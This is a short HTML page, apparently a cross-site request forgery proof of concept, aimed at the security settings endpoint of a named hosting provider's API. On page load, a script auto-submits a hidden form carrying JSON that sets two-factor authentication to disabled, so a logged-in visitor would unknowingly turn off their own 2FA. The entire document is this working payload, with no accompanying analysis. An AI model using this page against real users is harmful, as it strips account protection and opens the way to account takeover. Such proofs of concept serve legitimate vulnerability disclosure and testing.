<!DOCTYPE html>
<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script>
$(document).ready(function() {
    // Prepare the data as a stringified JSON object
    var jsonData = JSON.stringify({ "2fa_enabled": false });

    // Set the hidden input field to hold the JSON data
    $("#z").val(jsonData); // Assign the stringified JSON to the input field

    // Submit the form
    $("#f").submit();  // Automatically submit the form
});
</script>
</head>
<body>
<form id="f" enctype="application/x-www-form-urlencoded" action="https://my.ishosting.com/api/settings/security" method="post">
    <!-- Hidden input that will hold the JSON data -->
    <input id="z" type="hidden" name="test" value="">
    <input type="submit" value="send">
</form>
</body>
</html>
